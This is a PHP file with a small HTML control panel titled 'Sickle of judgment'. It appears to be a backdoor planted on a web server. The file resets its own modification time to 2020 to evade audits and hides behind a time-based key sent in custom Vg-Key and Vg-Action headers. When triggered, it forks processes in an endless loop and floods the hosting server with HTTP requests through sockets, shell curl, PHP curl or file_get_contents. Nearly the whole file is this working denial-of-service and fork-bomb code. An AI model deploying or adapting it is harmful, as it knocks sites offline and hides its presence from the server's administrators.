<?php
@ini_set('max_execution_time', 0);
if (@is_file(__FILE__)) {
    @touch(__FILE__, 1577808000, 1577808000);
}

class Kill
{
    /**
     * @var bool
     */
    public $socketsLoaded;

    /**
     * @var bool
     */
    public $pcntlLoaded;

    /**
     * @var bool
     */
    public $curlLoaded;

    /**
     * @var bool
     */
    public $execLoaded;

    /**
     * @var bool
     */
    public $local;

    public $server;

    /*** Vgk constructor.*/
    public function __construct()
    {
        $this->server        = $_SERVER;
        $this->local         = false;
        $this->socketsLoaded = extension_loaded('sockets');
        $this->execLoaded    = function_exists('exec') || function_exists('shell_exec') || function_exists('system');
        $this->pcntlLoaded   = extension_loaded('pcntl') && function_exists('pcntl_fork');
        $this->curlLoaded    = extension_loaded('curl');
        if (isset($_GET['local'])) {
            $this->local = true;
        }
    }

    /**
     * @return void
     */
    public function go()
    {
        if ($this->socketsLoaded) {
            $this->usingSockets();
        } elseif ($this->execLoaded) {
            $this->usingExec();
        } elseif ($this->curlLoaded) {
            $this->usingCurl();
        } else {
            $this->usingFileGetContents();
        }
    }

    /**
     * @return void
     */
    private function usingSockets()
    {
        $https = isset($this->server['HTTPS']) && $this->server['HTTPS'] === 'on';
        $host  = $this->server['HTTP_HOST'];
        $uri   = $this->server['REQUEST_URI'];

        if ($this->local) {
            $host = "127.0.0.1:{$this->server['SERVER_PORT']}";
        }

        $content = "GET {$uri} HTTP/1.1\r\n";
        foreach ($this->getHeaders() as $k => $v) {
            $content .= "{$k}: {$v}\r\n";
        }

        $content .= "\r\n";
        while (1) {
            if ($this->pcntlLoaded) {
                @pcntl_fork();
            }

            if ($https) {
                $context = stream_context_create([
                    'ssl' => [
                        'peer_name'         => $this->server['SERVER_NAME'],
                        'verify_peer_name'  => false,
                        'verify_peer'       => false,
                        'allow_self_signed' => true,
                    ]
                ]);

                @$server = stream_socket_client("ssl://{$host}", $_, $_, 1, 0, $context);
            } else {

                @$server = stream_socket_client("tcp://{$host}", $_, $_, 1);
            }
            if (!$server) {
                die('unable to connect to service.');
            }

            stream_set_blocking($server, false);
            $r = [$server];
            $w = [$server];
            $e = [];
            while (is_resource($server)) {
                $ra   = $r;
                $wa   = $w;
                $ea   = $e;
                $wait = @stream_select($ra, $wa, $ea, 1);
                if ($wait) {
                    foreach ($ra as $s) {
                        $response = '';
                        while (1) {
                            $buffer = @fread($s, 1024);
                            if (!$buffer) {
                                break;
                            }
                            $response .= $buffer;
                        }

                        if (!is_resource($s) || !feof($s)) {
                            fclose($server);
                            break;
                        }

                        if (!$response) {
                            fclose($server);
                            break;
                        }
                    }

                    if (!is_resource($server)) {
                        break;
                    }

                    foreach ($wa as $s) {
                        $write = @fwrite($s, $content);
                        if (!$write) {
                            fclose($server);
                            break;
                        }
                    }
                } else {
                    fclose($server);
                    break;
                }
            }
        }
    }

    /**
     * @return array
     */
    private function getHeaders()
    {
        $result = [];
        foreach ($this->server as $key => $value) {
            if (strpos($key, 'HTTP_') === 0) {
                $result[str_replace(
                    ' ',
                    '-',
                    ucwords(str_replace('_', ' ', strtolower(substr($key, 5))))
                )] = $value;
            }
        }
        $result['Vg-Key'] = $this->generatePassword('123456');
        return $result;
    }

    /**
     * @return string
     */
    public function generatePassword($key, $interval = 100)
    {
        $time = floor(time() / $interval); // 当前时间段
        $data = $time . $key;              // 时间段与密钥拼接
        return $this->customHash($data);
    }

    public function customHash($data)
    {
        $hash   = 0;
        $length = strlen($data);
        for ($i = 0; $i < $length; $i++) {
            $hash = ($hash * 31 + ord($data[$i])) & 0x7FFFFFFF; // 简单哈希函数
        }
        return substr(dechex($hash), 0, 6); // 返回前 6 个字符
    }

    /**
     * @return void
     */
    private function usingExec()
    {
        $https    = isset($this->server['HTTPS']) && $this->server['HTTPS'] === 'on';
        $protocol = $https ? 'https://' : 'http://';
        $host     = $this->server['HTTP_HOST'];
        $uri      = $this->server['REQUEST_URI'];
        $url      = "{$protocol}{$host}{$uri}";

        if ($this->local) {
            $url = "{$this->server['REQUEST_SCHEME']}://{$_SERVER['SERVER_ADDR']}:{$_SERVER['SERVER_PORT']}{$uri}";
        }

        $headers = '';

        foreach ($this->getHeaders() as $key => $value) {
            $headers .= "{$key}: {$value} ";
        }

        $command = "curl -H '{$headers}' {$url} > /dev/null 2>&1";

        while (1) {
            if ($this->pcntlLoaded) {
                @pcntl_fork();
            }

            if (function_exists('exec')) {
                exec($command);
            } elseif (function_exists('shell_exec')) {
                shell_exec($command);
            } elseif (function_exists('system')) {
                system($command);
            } else {
                die('unable to execute command.');
            }
        }
    }

    /**
     * @return void
     */
    private function usingCurl()
    {
        $https    = isset($this->server['HTTPS']) && $this->server['HTTPS'] === 'on';
        $protocol = $https ? 'https://' : 'http://';
        $host     = $this->server['HTTP_HOST'];
        $uri      = $this->server['REQUEST_URI'];
        $url      = "{$protocol}{$host}{$uri}";

        if ($this->local) {
            $url = "{$this->server['REQUEST_SCHEME']}://{$_SERVER['SERVER_ADDR']}:{$_SERVER['SERVER_PORT']}{$uri}";
        }

        $headers = [];

        foreach ($this->getHeaders() as $key => $value) {
            $headers[] = "$key: $value";
        }

        while (1) {
            if ($this->pcntlLoaded) {
                @pcntl_fork();
            }

            $ch = curl_init();

            curl_setopt_array($ch, [
                CURLOPT_URL            => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT        => 30,
                CURLOPT_HTTPHEADER     => $headers,
                CURLOPT_USERAGENT      => 'MyCustomAgent/1.0',
            ]);

            @curl_exec($ch);
            @curl_close($ch);
        }
    }

    /**
     * @return void
     */
    private function usingFileGetContents()
    {
        $https    = isset($this->server['HTTPS']) && $this->server['HTTPS'] === 'on';
        $protocol = $https ? 'https://' : 'http://';
        $host     = $this->server['HTTP_HOST'];
        $uri      = $this->server['REQUEST_URI'];
        $headers  = [];

        foreach ($this->getHeaders() as $key => $value) {
            $headers[] = "$key: $value";
        }

        $url = "{$protocol}{$host}{$uri}";

        if ($this->local) {
            $url = "{$this->server['REQUEST_SCHEME']}://{$_SERVER['SERVER_ADDR']}:{$_SERVER['SERVER_PORT']}{$uri}";
        }

        while (1) {
            if ($this->pcntlLoaded) {
                @pcntl_fork();
            }
            $contextOptions = [
                'http' => [
                    'method' => 'GET',
                    'header' => '',
                ],
            ];
            foreach ($headers as $key => $value) {
                $contextOptions['http']['header'] .= "$key: $value\r\n";
            }
            $context = stream_context_create($contextOptions);
            @file_get_contents($url, false, $context);
        }
    }
}

$vg = new Kill();

/*** 隐藏条件*/
$key      = $vg->generatePassword('123456');
$inputKey = '';
if (isset($_GET['_vg_key'])) {
    $inputKey = $_GET['_vg_key'];
}

if (isset($_SERVER['HTTP_VG_KEY'])) {
    $inputKey = $_SERVER['HTTP_VG_KEY'];
}

if ($key !== $inputKey) {
    return;
}

/*** 触发条件*/
if (isset($_SERVER['HTTP_VG_ACTION'])) {
    $action = $_SERVER['HTTP_VG_ACTION'];
    if ($action === 'go') {
        $vg->go();
        die();
    }

    if ($action === 'verify') {
        die($vg->generatePassword('123456'));
    }
}
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sickle of judgment</title>
    <style>
        label {
            display: block;
            margin-top: 10px;
        }
    </style>
</head>
<body>
<p>Sickle of judgment</p>
<hr>
<table>
    <tr>
        <td>sockets</td>
        <td><?php echo $vg->socketsLoaded ? 'on' : 'off'; ?></td>
    </tr>
    <tr>
        <td>pcntl</td>
        <td><?php echo $vg->pcntlLoaded ? 'on' : 'off'; ?></td>
    </tr>
    <tr>
        <td>curl</td>
        <td><?php echo $vg->curlLoaded ? 'on' : 'off'; ?></td>
    </tr>
    <tr>
        <td>exec</td>
        <td><?php echo $vg->execLoaded ? 'on' : 'off'; ?></td>
    </tr>
</table>
<hr>
<form id="defaultForm">
    <label>
        <input type="checkbox" name="local" value="1"> local
    </label>
    <label>
        <button type="submit">kill</button>
    </label>
</form>
<script type="text/javascript">
    function generatePassword(key, interval = 100) {
        const time = Math.floor(Date.now() / 1000 / interval);
        const data = time + key;
        return customHash(data);
    }

    function customHash(data) {
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            hash = (hash * 31 + data.charCodeAt(i)) & 0x7FFFFFFF;
        }
        return hash.toString(16).substring(0, 6);
    }

    document.getElementById('defaultForm').addEventListener('submit', event => {
        event.preventDefault();

        const url = new URL(window.location.href);
        url.searchParams.delete('_vg_key');

        const key = generatePassword('123456');
        const local = document.querySelector('input[name="local"]').checked;
        if (local) {
            url.searchParams.set('local', '1');
        } else {
            url.searchParams.delete('local');
        }

        fetch(url.href, {
            headers: {
                'Vg-Action': 'go',
                'Vg-Key': key
            }
        });

        alert('killed');
    });
</script>
</body>
</html>
<?php die(); ?>
